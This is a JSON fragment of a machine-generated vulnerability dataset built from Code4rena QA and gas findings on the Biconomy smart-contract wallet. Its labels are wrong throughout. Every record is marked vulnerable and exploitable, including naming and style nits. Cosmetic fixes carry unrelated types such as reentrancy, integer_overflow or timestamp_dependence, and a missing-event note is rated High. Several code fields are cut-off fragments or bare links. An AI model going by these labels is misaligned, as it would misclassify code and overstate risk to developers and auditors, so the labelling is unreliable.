    "description": "For cleaner Solidity code in conjunction with the rule of modularity and modular programming, use named imports with curly braces instead of adopting the global import approach. For instance, the import instances below could be refactored as follows: [File: ModuleManager.sol#L4-L6](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L4-L6) - import \"../common/Enum.sol\"; - import \"../common/SelfAuthorized.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.253,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " expression where possible. For instance, the instance below could have its code line refactored as follows:\n\n[File: SmartAccount.sol#L42-L48](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L42-L48)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Expression for Hashed Values",
    "description": "Long bytes of literal values assigned to constants may incur typo/human error. In fact, it was validated in the constructor of Proxy.sol and Singleton.sol using `assert()` to compare the hashed constant with its `bytes32()` result to avoid this error: [File: Singleton.sol#L13](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol#L13) [File: Proxy.sol#L16](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/Proxy.sol#L16) assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); As such, consider at least assigning these constants with their corresponding `bytes32()` expression where possible. For instance, the instance below could have its code line refactored as follows:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.273,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n        // TODO: copy logic of gasPrice?\n",
    "vulnerability_label": 1,
    "vulnerability_type": "dos",
    "severity": "Medium",
    "title": "Open TODOs",
    "description": "Open TODOs can point to architecture or programming issues that still need to be resolved. Consider resolving them before deploying. Here is the one instance entailed: [File: EntryPoint.sol#L255](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L255) // TODO: copy logic of gasPrice?",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.05,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\n+ event Received(uint indexed value, address indexed sender, bytes data);\n\n-    receive() external payable {}\n+    receive() external payable {\n+        emit Received(msg.value, msg.sender, \"\");\n+    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Empty blocks",
    "description": "Function with empty block should have a comment explaining why it is empty, or an event emitted. For instance, the fallback instance may be refactored as follows just as it has been done in Proxy.sol: [File: SmartAccount.sol#L550](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L550) + event Received(uint indexed value, address indexed sender, bytes data); -    receive() external payable {}",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.207,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n    function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n        require(dest != address(0), \"this action will burn your funds\");\n+        require(dest.isContract(), \"INVALID_IMPLEMENTATION\");\n        (bool success,) = dest.call{value:amount}(\"\");\n        require(success,\"transfer failed\");\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Missing checks for contract existence",
    "description": "Performing a low-level calls without confirming contract\u2019s existence (not yet deployed or have been destructed which could still be a non-zero address) could return success even though no function call was executed as documented in the link below: https://docs.soliditylang.org/en/v0.8.7/control-structures.html#error-handling-assert-require-revert-and-exceptions Consider check for target contract existence before call. Here is an instance entailed that could be refactored by making use of [LibAddress.sol](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/LibAddress.sol) that has already been imported to the contract: [File: SmartAccount.sol#L449-L453](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L449-L453)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.337,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[File: SmartAccountFactory.sol#L22](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L22)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Commented codes",
    "description": "Throughout the code base, there are several commented code lines that could point to items that are not done or need redesigning, be a mistake, debugging or just be testing overhead. Consider removing them before deployment for readability and conciseness. Here are some of the instances entailed: [File: SmartAccount.sol#L68-L69](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L68-L69) // nice to have // event SmartAccountInitialized(IEntryPoint indexed entryPoint, address indexed owner);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.17,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "diff\n-        modules[module] = address(0);\n+        delete modules[module];\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Use `delete` to clear variables",
    "description": "`delete a` assigns the initial value for the type to `a`. i.e. for integers it is equivalent to `a = 0`, but it can also be used on arrays, where it assigns a dynamic array of length zero or a static array of the same length with all elements reset. For structs, it assigns a struct with all members reset. Similarly, it can also be used to set an address to zero address or a boolean to false. It has no effect on whole mappings though (as the keys of mappings may be arbitrary and are generally unknown). However, individual keys and what they map to can be deleted: If `a` is a mapping, then `delete a[x]` will delete the value stored at x. The delete key better conveys the intention and is also more idiomatic. For instance, the `a[x]` instance below may be refactored as follows: [File: ModuleManager.sol#L52](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L52) -        modules[module] = address(0);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.077,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[File: ERC777TokensRecipient.sol#L4](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC777TokensRecipient.sol#L4)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Inconsistency in interface naming",
    "description": "Some interfaces in the code bases are named without the prefix `I` that could cause confusion to developers and readers referencing or interacting with the protocol. Consider conforming to Solidity's naming conventions by having the instances below refactored as follow: [File: ERC1155TokenReceiver.sol#L7](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol#L7) - interface ERC1155TokenReceiver { + interface IERC1155TokenReceiver { [File: ERC721TokenReceiver.sol#L5](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC721TokenReceiver.sol#L5)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.183,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n// SPDX-License-Identifier: LGPL-3.0-only\npragma solidity 0.8.12;\n\n- contract ISignatureValidatorConstants {\n+ contract SignatureValidatorConstants {\n    // bytes4(keccak256(\"isValidSignature(bytes,bytes)\")\n    bytes4 internal constant EIP1271_MAGIC_VALUE = 0x20c13b0b;\n}\n\n- abstract contract ISignatureValidator is ISignatureValidatorConstants {\n+ abstract contract SignatureValidator is ISignatureValidatorConstants {\n    /**\n     * @dev Should return whether the signature provided is valid for the provided data\n     * @param _data Arbitrary length data signed on the behalf of address(this)\n     * @param _signature Signature byte array associated with _data\n     *\n     * MUST return the bytes4 magic value 0x20c13b0b when function passes.\n     * MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5)\n     * MUST allow external calls\n     */\n    function isValidSignature(bytes memory _data, bytes memory _signature) public view virtual returns (bytes4);\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Contracts should be imported",
    "description": "In `ISignatureValidator.sol`, the contract `ISignatureValidatorConstants` is showing up in its entirety at the top of the abstract contract `ISignatureValidator` which facilitates ease of references on the same file page. Additionally, both the contract and the abstract contract have been named with the prefix `I` that is generally (if not exclusively) reserved for interfaces. Consider: 1. having their names renamed as follows: [File: ISignatureValidator.sol](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n-        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n+        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), address(this)));\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "`address(this)` over `this`",
    "description": "As denoted in [Solidity Documentation](https://docs.soliditylang.org/en/v0.5.0/units-and-global-variables.html): \"Prior to version 0.5.0, Solidity allowed address members to be accessed by a contract instance, for example this.balance. This is now forbidden and an explicit conversion to address must be done: address(this).balance.\" Here is an instance entailed: [File: SmartAccount.sol#L136](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L136) -        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.186,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n    function setSigner( address _newVerifyingSigner) external onlyOwner{\n        require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\n        verifyingSigner = _newVerifyingSigner;\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Lack of events for critical operations",
    "description": "Critical operations not triggering events will make it difficult to review the correct behavior of the deployed contracts. Users and blockchain monitoring systems will not be able to detect suspicious behaviors at ease without events. Consider adding events where appropriate for all critical operations for better support of off-chain logging API. Here is an instance entailed: [File: VerifyingSingletonPaymaster.sol#L65-L68](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L65-L68) function setSigner( address _newVerifyingSigner) external onlyOwner{ require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.245,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n-   function internalIncrementDeposit(address account, uint256 amount) internal {\n+   function internalIncrementDeposit(address account, uint256 amount) internal returns (uint112 ret) {\n        DepositInfo storage info = deposits[account];\n        uint256 newAmount = info.deposit + amount;\n        require(newAmount <= type(uint112).max, \"deposit overflow\");\n+       ret = uint112(newAmount);\n+       info.deposit = ret;\n-       info.deposit = uint112(newAmount);\n    }\n    function depositTo(address account) public payable {\n-       internalIncrementDeposit(account, msg.value);\n+       emit Deposited(account, internalIncrementDeposit(account, msg.value));\n-       DepositInfo storage info = deposits[account];\n-       emit Deposited(account, info.deposit);\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "**2. Optimize `internalIncrementDeposit`**",
    "description": "It's possible to optimize the `internalIncrementDeposit` method like follows: -   function internalIncrementDeposit(address account, uint256 amount) internal { +   function internalIncrementDeposit(address account, uint256 amount) internal returns (uint112 ret) { DepositInfo storage info = deposits[account]; uint256 newAmount = info.deposit + amount;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.773,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\nmint tokens to owner address..\n{\n  to: '0x0ed64d01D0B4B655E410EF1441dD677B695639E7',\n  value: 0,\n  data: '0xa9059cbb0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000000000000000000000000000008ac7230489e80000',\n  operation: 0,\n  targetTxGas: 0,\n  baseGas: 0,\n  gasPrice: 0,\n  tokenGasPriceFactor: 1,\n  gasToken: '0x0000000000000000000000000000000000000000',\n  refundReceiver: '0x0000000000000000000000000000000000000000',\n  nonce: BigNumber { value: \"0\" }\n}\n- estimated gas to be used  102719\n+ estimated gas to be used  102710\n- Real txn gas used:  98875\n+ Real txn gas used:  98866\n\ntargetTxGas estimation part 1:  36544\n- estimated gas to be used  135491\n+ estimated gas to be used  135482\n{\n-  baseGas: 103947,\n+  baseGas: 103938,\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "**4. Reorder structure layout**",
    "description": "The following structures could be optimized moving the position of certain values in order to save some storage slots: struct Transaction { address to; +       Enum.Operation operation; uint256 value;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 27,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.776,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n        \u221a legacy mode (maxPriorityFee==maxFeePerGas) should not use \"basefee\" opcode\n-    == est gas= 114321\n+    == est gas= 114297\n-   rcpt.gasUsed= 111704 0x914c39060be62a5980f0ffa05b56214fc3301dbc44b7ba872afd0753058b95ca\n+   rcpt.gasUsed= 111680 0xa023ccb107b9dc80adcb3d031d48664146215e76e030839f0d8033f100d44faf\n-   \t== actual gasUsed (from tx receipt)= 111704\n+       == actual gasUsed (from tx receipt)= 111680\n\n      create account\n        \u221a should reject if account not funded\n-   == create gasUsed= 381974\n+   == create gasUsed= 381962\n-   == actual gasUsed (from tx receipt)= 381974\n+\t== actual gasUsed (from tx receipt)= 381962\n\n- |  \u001b[90mEntryPoint\u001b[39m               \u00b7  handleAggregatedOps         \u00b7     \u001b[36m163341\u001b[39m  \u00b7     \u001b[31m345337\u001b[39m  \u00b7     245824  \u00b7            \u001b[90m6\u001b[39m  \u00b7          \u001b[32m\u001b[90m-\u001b[32m\u001b[39m  \u2502\n+ |  \u001b[90mEntryPoint\u001b[39m               \u00b7  handleAggregatedOps         \u00b7     \u001b[36m163341\u001b[39m  \u00b7     \u001b[31m345337\u001b[39m  \u00b7     245822  \u00b7            \u001b[90m6\u001b[39m  \u00b7          \u001b[32m\u001b[90m-\u001b[32m\u001b[39m  \u2502\n- |  \u001b[90mEntryPoint\u001b[39m               \u00b7  handleOps                   \u00b7     \u001b[36m101633\u001b[39m  \u00b7     \u001b[31m507641\u001b[39m  \u00b7     256369  \u00b7           \u001b[90m28\u001b[39m  \u00b7          \u001b[32m\u001b[90m-\u001b[32m\u001b[39m  \u2502\n+ |  \u001b[90mEntryPoint\u001b[39m               \u00b7  handleOps                   \u00b7     \u001b[36m101597\u001b[39m  \u00b7     \u001b[31m507653\u001b[39m  \u00b7     256364  \u00b7           \u001b[90m28\u001b[39m  \u00b7          \u001b[32m\u001b[90m-\u001b[32m\u001b[39m  \u2502\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Medium",
    "title": "**5. Use the `unchecked` keyword**",
    "description": "When an underflow or overflow cannot occur, one might conserve gas by using the `unchecked` keyword to prevent unnecessary arithmetic underflow/overflow tests. function simulateValidation(UserOperation calldata userOp) external { uint256 preGas = gasleft(); UserOpInfo memory outOpInfo; (address aggregator, uint256 deadline) = _validatePrepayment(0, userOp, outOpInfo, SIMULATE_FIND_AGGREGATOR);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity \nFile: scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol\n109:     function setOwner(address _newOwner) external mixedAuth {\n110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n111:         address oldOwner = owner;\n112:         owner = _newOwner;\n113:         emit EOAChanged(address(this), oldOwner, _newOwner);\n114:     }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "#### Update value order can be adjusted to simplify the code and save gas",
    "description": "For example, to update the `val` variable with `newVal`, the current way is as following: uint oldVal = val; val = newVal; emit update(oldVal, newVal); If the execution order is adjusted, some operations can be saved (memory space allocation, variable assignment), reducing both the deployment and run time gas cost.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.403,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "address().code.length",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "Finding Summary",
    "description": "||Issue|Instances| |-|-|-| |[NC-01]|Long Lines (> 120 Characters)|85| |[NC-02]|Contracts Missing `@title` NatSpec Tag|25| |[NC-03]|`TODO` Left In Production Code|11|",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "42:    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n46:    //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n186:    /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.\n222:        // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500)\n223:        // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150\n227:            // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than targetTxGas)\n228:            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas\n229:            success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n230:            // If no targetTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful\n231:            // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn't revert\n233:            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls\n239:                payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n300:     * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.\n320:                // This check is not completely accurate, since it is possible that more signatures than the threshold are send.\n327:                // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\n339:                    // The signature data for contract signatures is appended to the concatenated signatures and the offset is stored in s\n342:                require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n346:            // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover\n356:    ///      This method is only meant for estimation purpose, therefore the call will always revert and encode the result in the revert data.\n357:    ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`\n489:    function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        ",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "Findings:",
    "description": "*scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol* Links: [20](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol#L20), [24](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol#L24). 20:     *      In case there is a paymaster in the request (or the current deposit is high enough), this value will be zero. 24:    function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds) *scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol*",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n*/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol*\nLinks: [44](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L44), [58](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L58), [313](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L313).\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Findings:",
    "description": "*scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol* Links: [255](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L255). 255:        // TODO: copy logic of gasPrice? */scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol* Links: [59](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L59), [86](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L86),",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.47,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n*/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol*\nLinks: [53](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L53), [255](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L255), [267](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L267).\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Findings:",
    "description": "*/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol* Links: [10](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L10), [25](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L25), [125](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L125). 10:\t// import \"../samples/Signatures.sol\"; 25:\t// possibly //  using Signatures for UserOperation; 125:\t// (mode,context,actualGasCost); // unused params",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.472,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " _requireFromEntryPoint",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "*scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol* ([R](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol)) * ` validateUserOp` ('external', 'override', 'virtual'): virtual (Virtual) positioned after override (Override). * ` _requireFromEntryPoint` ('internal', 'virtual', 'view'): view (Mutability) positioned after virtual (Virtual). *scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol* ([R](https://github.com/code-423n4/2023-01-biconomy/tree/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol)) * ` handleAggregatedOps` ('payable', 'public'): public (Visibility) positioned after payable (Mutability).",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n201:        //console.log(\"init %s\", 21000 + msg.data.length * 8);\n237:                //console.log(\"sent %s\", startGas - gasleft());\n243:            //console.log(\"extra gas %s \", extraGas);\n268:        //console.log(\"hp %s\", requiredGas);\n292:        //console.log(\"hpr %s\", requiredGas);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
